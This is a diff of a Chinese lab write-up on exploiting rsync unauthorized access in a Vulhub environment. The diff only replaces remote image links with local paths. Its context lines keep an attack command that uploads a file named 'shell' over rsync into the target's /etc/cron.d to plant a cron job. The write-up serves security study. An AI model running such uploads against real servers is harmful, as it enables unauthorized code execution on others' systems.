@@ -19,7 +19,7 @@ docker-compose up -d
 rsync rsync://your-ip:873/
 ```
 
-![image-20220303133847165](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203031338267.png)
+![image-20220303133847165](./images/202203031338267.png)
 
 > 若Vulhub环境启动时报错`standard_init_linux.go:211: exec user process caused "no such file or directory"`，执行命令 `dos2unix docker-entrypoint.sh`，即可成功启动。
 
@@ -61,7 +61,7 @@ shell文件内容如下：
 rsync -av shell rsync://192.168.174.128:873/src/etc/cron.d/shell
 ```
 
-![image-20220303140727513](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203031407618.png)
+![image-20220303140727513](./images/202203031407618.png)
 
 
 
